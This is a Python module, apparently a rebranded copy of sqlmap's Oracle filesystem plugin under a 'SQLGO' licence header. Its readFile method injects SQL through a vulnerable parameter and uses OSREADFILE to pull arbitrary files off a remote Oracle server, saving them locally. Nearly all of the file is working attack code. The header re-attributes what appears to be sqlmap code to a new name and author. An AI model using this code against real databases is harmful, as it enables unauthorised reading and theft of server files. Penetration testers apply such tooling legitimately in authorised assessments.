"""
# SQLGO License - Version 1.1

Copyright (C) 2023-2024 Heisenberg

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.


"""
from sqlmap.lib.core.agent import agent
from sqlmap.lib.core.common import dataToOutFile
from sqlmap.lib.core.common import decodeDbmsHexValue
from sqlmap.lib.core.common import getSQLSnippet
from sqlmap.lib.core.common import isNoneValue
from sqlmap.lib.core.data import kb
from sqlmap.lib.core.data import logger
from sqlmap.lib.core.enums import CHARSET_TYPE
from sqlmap.lib.core.enums import DBMS
from sqlmap.lib.core.exception import SqlmapUnsupportedFeatureException
from sqlmap.lib.request import inject
from sqlmap.lib.request.connect import Connect as Request
from sqlmap.plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    def readFile(self, remoteFile):
        localFilePaths = []
        snippet = getSQLSnippet(DBMS.ORACLE, "read_file_export_extension")

        for query in snippet.split("\n"):
            query = query.strip()
            query = agent.prefixQuery("OR (%s) IS NULL" % query)
            query = agent.suffixQuery(query, trimEmpty=False)
            payload = agent.payload(newValue=query)
            Request.queryPage(payload, content=False, raise404=False, silent=True, noteResponseTime=False)

        for remoteFile in remoteFile.split(','):
            if not kb.bruteMode:
                infoMsg = "fetching file: '%s'" % remoteFile
                logger.info(infoMsg)

            kb.fileReadMode = True
            fileContent = inject.getValue("SELECT RAWTOHEX(OSREADFILE('%s')) FROM DUAL" % remoteFile, charsetType=CHARSET_TYPE.HEXADECIMAL)
            kb.fileReadMode = False

            if not isNoneValue(fileContent):
                fileContent = decodeDbmsHexValue(fileContent, True)

                if fileContent.strip():
                    localFilePath = dataToOutFile(remoteFile, fileContent)
                    localFilePaths.append(localFilePath)

            elif not kb.bruteMode:
                errMsg = "no data retrieved"
                logger.error(errMsg)

        return localFilePaths

    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):
        errMsg = "File system write access not yet implemented for "
        errMsg += "Oracle"
        raise SqlmapUnsupportedFeatureException(errMsg)
